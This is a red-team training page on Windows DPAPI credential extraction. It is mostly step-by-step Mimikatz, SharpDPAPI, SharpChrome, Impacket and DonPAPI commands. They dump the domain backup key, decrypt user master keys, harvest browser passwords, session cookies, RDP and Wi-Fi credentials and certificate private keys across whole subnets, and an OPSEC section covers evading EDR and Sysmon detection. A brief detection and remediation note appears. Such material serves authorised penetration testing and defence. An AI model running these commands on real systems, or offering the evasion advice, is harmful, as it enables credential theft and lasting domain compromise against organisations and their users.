---
layout: training-page
title: "DPAPI Abuse & Credential Extraction — Red Team Academy"
module: "Active Directory"
tags:
  - dpapi
  - credential-access
  - windows
  - active-directory
  - mimikatz
page_key: "ad-dpapi-abuse"
---

<h1>DPAPI Abuse &amp; Credential Extraction</h1>

<p>The Data Protection API (DPAPI) is Windows' built-in mechanism for encrypting sensitive data — browser passwords, Wi-Fi credentials, RDP passwords, certificate private keys, and more. Every Windows user has DPAPI master keys derived from their password. If you obtain a user's DPAPI master keys (via domain backup key, user password, or memory extraction), you can decrypt all their protected data without touching LSASS. DPAPI abuse is a critical post-exploitation technique that bypasses many credential theft detections.</p>

<h2>How DPAPI Works</h2>

<pre><code># DPAPI encryption hierarchy:
#
# User Password
#   └─&gt; DPAPI Master Key (stored encrypted in %APPDATA%\Microsoft\Protect\{SID}\)
#         └─&gt; Derived encryption keys
#               └─&gt; Protected data (browser creds, certificates, Wi-Fi, etc.)
#
# Key points:
# - Each user has multiple master keys (rotated every ~90 days)
# - Master keys are encrypted with the user's password hash
# - Domain controllers hold a backup key that can decrypt ANY user's master keys
# - The backup key never changes (until manually rotated)
# - SYSTEM can decrypt any local user's master keys
# - Machine DPAPI keys protect machine-level secrets

# Master key locations:
# User: C:\Users\{user}\AppData\Roaming\Microsoft\Protect\{SID}\
# Machine: C:\Windows\System32\Microsoft\Protect\S-1-5-18\

# DPAPI-protected data locations:
# Chrome passwords: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
# Chrome cookies: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
# Edge passwords: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
# Wi-Fi profiles: C:\ProgramData\Microsoft\Wlansvc\Profiles\
# RDP credentials: %APPDATA%\Microsoft\Credentials\
# Windows Vault: %APPDATA%\Microsoft\Vault\
# Certificate private keys: %APPDATA%\Microsoft\Crypto\RSA\{SID}\</code></pre>

<h2>Extracting DPAPI Master Keys</h2>

<h3>Method 1: Domain Backup Key (Domain Admin)</h3>

<pre><code># The domain DPAPI backup key can decrypt ANY domain user's master keys
# Requires Domain Admin or equivalent

# Extract the backup key with Mimikatz
mimikatz # lsadump::backupkeys /system:dc01.corp.local /export

# This creates:
# - ntds_capi_0_GUID.pvk   (legacy backup key)
# - ntds_capi_0_GUID.der   (legacy backup cert)
# - ntds_legacy_0_GUID.key (current backup key)

# With SharpDPAPI
SharpDPAPI.exe backupkey /nowrap

# With Impacket (remote, from Linux)
dpapi.py backupkey -t corp.local/admin:Password123@dc01.corp.local --export

# Use the backup key to decrypt any user's master key
dpapi.py masterkey -file master_key_file -pvk backup_key.pvk</code></pre>

<h3>Method 2: User Password / NTLM Hash</h3>

<pre><code># If you know the user's password or NTLM hash,
# you can decrypt their master keys directly

# Mimikatz — decrypt master key with password
mimikatz # dpapi::masterkey /in:C:\Users\victim\AppData\Roaming\Microsoft\Protect\{SID}\{GUID} /password:UserPassword123

# Mimikatz — decrypt master key with NTLM hash (pass-the-hash)
mimikatz # dpapi::masterkey /in:{masterkey_file} /hash:{NTLM_hash}

# SharpDPAPI — with password
SharpDPAPI.exe masterkeys /password:UserPassword123

# Impacket — decrypt master key with hash
dpapi.py masterkey -file {masterkey_file} -sid {user_SID} -password UserPassword123</code></pre>

<h3>Method 3: LSASS Memory (Without Credential Dumping Detections)</h3>

<pre><code># LSASS caches DPAPI master keys in memory
# Extract them without triggering credential dumping alerts

# Mimikatz — extract cached master keys from LSASS
mimikatz # sekurlsa::dpapi

# This gives you the plaintext master keys without needing the password
# Works on the current machine where LSASS is running

# From a minidump
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::dpapi</code></pre>

<h2>Decrypting Protected Data</h2>

<h3>Chrome / Edge Passwords</h3>

<pre><code># Chrome stores passwords in an SQLite database, encrypted with DPAPI
# Since Chrome v80+, uses AES-256-GCM with a key protected by DPAPI

# Step 1: Get the DPAPI-encrypted AES key from Local State
type "%LOCALAPPDATA%\Google\Chrome\User Data\Local State"
# Look for "encrypted_key" in the JSON — base64 encoded, DPAPI-encrypted

# Step 2: Decrypt the AES key using DPAPI
# The key starts with "DPAPI" prefix (5 bytes), then DPAPI blob

# Step 3: Use the AES key to decrypt passwords from Login Data SQLite DB

# Automated with SharpDPAPI
SharpDPAPI.exe triage /password:UserPassword123
# Decrypts: Chrome passwords, cookies, RDP creds, certificates

# Automated with SharpChrome
SharpChrome.exe logins /unprotect
SharpChrome.exe cookies /unprotect

# From Linux with Impacket + dpapi.py
# 1. Extract Login Data and Local State files from target
# 2. Decrypt locally
dpapi.py credential -file Login\ Data -key {decrypted_master_key}

# DonPAPI — automated DPAPI secret extraction (remote)
# github.com/login-securite/DonPAPI
DonPAPI.py corp.local/admin:Password123@10.10.10.0/24
# Automatically extracts and decrypts:
# - Chrome/Edge/Firefox passwords and cookies
# - Wi-Fi passwords
# - Windows credentials
# - Certificate private keys
# - SCCM credentials</code></pre>

<h3>Windows Credentials (RDP, Scheduled Tasks)</h3>

<pre><code># Windows Credential Manager stores:
# - RDP saved credentials
# - Network credentials (SMB shares)
# - Generic credentials (applications)

# Location: %APPDATA%\Microsoft\Credentials\

# List credential files
dir %APPDATA%\Microsoft\Credentials\

# Mimikatz — decrypt Windows credentials
mimikatz # dpapi::cred /in:C:\Users\victim\AppData\Roaming\Microsoft\Credentials\{GUID}

# You need the master key first — combine with:
mimikatz # dpapi::masterkey /in:{masterkey_file} /rpc
# /rpc uses the domain controller's backup key (requires domain user context)

# SharpDPAPI — automated credential decryption
SharpDPAPI.exe credentials /password:UserPassword123

# Scheduled task credentials
# Stored in: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\
# Encrypted with SYSTEM DPAPI keys
# Decrypt with SYSTEM master key + DPAPI</code></pre>

<h3>Wi-Fi Passwords</h3>

<pre><code># Wi-Fi profiles use machine DPAPI (SYSTEM context)
# Location: C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\

# Quick extraction (requires admin)
netsh wlan show profiles
netsh wlan show profile name="CorpWiFi" key=clear

# Mimikatz approach
mimikatz # dpapi::wifi /in:C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\{profile}.xml

# SharpDPAPI
SharpDPAPI.exe wifi</code></pre>

<h3>Certificate Private Keys</h3>

<pre><code># Certificate private keys protected by DPAPI
# Location: %APPDATA%\Microsoft\Crypto\RSA\{SID}\

# Critical for:
# - Code signing certificate theft
# - Smart card certificate theft
# - S/MIME email decryption
# - Client authentication certificates

# SharpDPAPI — extract certificate private keys
SharpDPAPI.exe certificates /password:UserPassword123

# Mimikatz
mimikatz # crypto::certificates /systemstore:my /export

# Combined with ADCS attacks:
# Steal a user's certificate → use for authentication
# Steal a CA certificate → forge any certificate</code></pre>

<h2>DonPAPI — Automated DPAPI Exploitation</h2>

<pre><code># DonPAPI automates the entire DPAPI attack chain
# github.com/login-securite/DonPAPI

# Install
pip install donpapi

# Run against a single target (with password)
DonPAPI.py corp.local/admin:Password123@10.10.10.5

# Run against a subnet
DonPAPI.py corp.local/admin:Password123@10.10.10.0/24

# Run with NTLM hash
DonPAPI.py corp.local/admin@10.10.10.5 -hashes :NTLM_HASH

# What DonPAPI collects:
# [+] Chrome/Edge/Firefox passwords
# [+] Chrome/Edge cookies (including session cookies)
# [+] Windows Credentials Manager entries
# [+] Wi-Fi passwords
# [+] Certificate private keys
# [+] SCCM Network Access Account credentials
# [+] VNC passwords
# [+] mRemoteNG credentials

# Output is organized by host and user
# Creates an HTML report for easy browsing</code></pre>

<h2>DPAPI in Domain Persistence</h2>

<pre><code># The domain DPAPI backup key is extremely powerful:
# - It never expires or rotates automatically
# - It can decrypt any domain user's DPAPI secrets
# - Persists through password changes
# - Only changes if manually rotated

# If you extract the backup key during an engagement:
# - You can decrypt any user's secrets offline, indefinitely
# - Even after the engagement ends and passwords are changed
# - Until the backup key is manually rotated

# Rotation (remediation):
# The backup key can only be rotated by Microsoft support
# Or by rebuilding the domain (nuclear option)
# There is no built-in cmdlet to rotate it

# Detection:
# - Monitor for DPAPI backup key access (Event ID 4662)
# - Monitor for bulk access to DPAPI master key files
# - Track unusual access to user profile directories</code></pre>

<h2>OPSEC Considerations</h2>

<pre><code># DPAPI abuse advantages over LSASS dumping:
# - No need to touch LSASS process
# - No PROCESS_VM_READ to lsass.exe (avoids Sysmon Event 10)
# - Files can be copied and decrypted offline
# - Less EDR detection coverage than credential dumping

# OPSEC tips:
# - Copy master key files and credential blobs to attacker machine
# - Decrypt offline — never run Mimikatz on the target if avoidable
# - Use DonPAPI or SharpDPAPI which avoid LSASS interaction
# - File access to master keys may still be logged by EDR minifilter
# - Accessing the domain backup key is logged and very suspicious</code></pre>

<h2>Resources</h2>

<ul>
  <li>DonPAPI — <code>github.com/login-securite/DonPAPI</code></li>
  <li>SharpDPAPI — <code>github.com/GhostPack/SharpDPAPI</code></li>
  <li>SharpChrome — <code>github.com/GhostPack/SharpDPAPI</code> (included)</li>
  <li>Impacket dpapi.py — <code>github.com/fortra/impacket</code></li>
  <li>DPAPI Primer — harmj0y's blog</li>
  <li>"Operational Guidance for Offensive User DPAPI Abuse" — SpecterOps</li>
  <li>MITRE ATT&amp;CK T1555.004 — Windows Credential Manager</li>
</ul>
